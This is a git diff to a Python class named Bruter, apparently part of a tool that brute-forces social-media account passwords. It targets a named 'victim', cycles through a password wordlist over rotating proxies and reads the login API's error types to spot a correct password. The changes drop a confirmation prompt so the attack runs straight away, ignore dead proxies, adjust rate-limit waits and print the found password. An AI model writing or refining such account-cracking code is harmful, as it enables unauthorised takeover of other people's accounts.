@@ -1,8 +1,8 @@
 from concurrent.futures import (ThreadPoolExecutor, as_completed)
-from .exceptions import (BlockedIP, DeadProxy, FuckedLogin,WrongPassword)
+from time import strftime
+from .exceptions import (BlockedIP, FuckedLogin,WrongPassword)
 from .proxychecker import ProxyChecker
 from .console import Console,runnerBrute
-from time import sleep
 import uuid
 import random
 import requests
@@ -17,7 +17,6 @@ class Bruter:
         self.__proxy_type = proxy_type
         self.__victim = victim
         self.__ip = 0
-        self.__password = None
         self.__readerwordlist
         self.__isFind = False
         self.__getproxy = []
@@ -39,9 +38,7 @@ class Bruter:
             print("No Working Proxy Found!")
         else:
             print(f"{Console.RED}target>{self.__victim}{Console.BANNER_BRUTE}")
-            _input_ = input(Console.COMMAND_LINE)
-            if _input_ != 'x':
-                self.__threadPool()
+            self.__threadPool()
 
     @property
     def __readerwordlist(self):
@@ -91,19 +88,17 @@ class Bruter:
                     raise BlockedIP()
             
                 if json_load["error_type"] == "bad_password":
-                    self.__password = passw
                     self.__isFind = False
                     raise WrongPassword()
                 
                 if json_load["message"] == "challenge_required":
                     self.__isFind = True
-                    #self.__password = passw
                     raise FuckedLogin()
                 
                 if json_load["error_type"] == "rate_limit_error":
-                    timeout = 60
+                    timeout = 100
             except requests.exceptions.ProxyError:
-                raise DeadProxy()
+                pass
 
     def __threadPool(self):
         with ThreadPoolExecutor(max_workers=None) as executor:
@@ -112,13 +107,17 @@ class Bruter:
                 value = future_to_password[future]
                 try:
                     future.result()
-                except (BlockedIP,WrongPassword,DeadProxy,FuckedLogin) as e:
+                except (BlockedIP,WrongPassword,FuckedLogin):
                     os.system("cls")
-                    print(runnerBrute(self.__password,self.__ip))
+                    print(runnerBrute(passw=value,words=len(list(self.__readerwordlist)),prxies=len(self.__getproxy),ip=self.__ip))
                     if self.__isFind:
-                        print(f"\t?\n\t╰──────≻Password Found: {self.__password}")
+                        print(f"{Console.DEFAULT}{Console.BOLD}\t?\n\t╰──────≻Password Found: {value}")
+                        sys.exit(0)
                 except (requests.exceptions.ConnectionError,requests.exceptions.ReadTimeout):
                     pass
-        print("\t?\n\t╰──────≻Brute Force Attack is Complate")
+                    #os.system("cls")
+                    #print(runnerBrute(,self.__ip,len(list(self.__readerwordlist)),len(self.__getproxy)))
+
+        print(f"?\n╰──────≻Brute Force Attack is Complate{Console.DEFAULT}")
         if self.__isFind == False:
-            print("Maalesef Doğru parola bulunamadı!")
+            print(f"\t{Console.BOLD}{Console.RED}[ {Console.PURPLE}!{Console.PURPLE} {Console.RED}] Password not found!{Console.DEFAULT}")
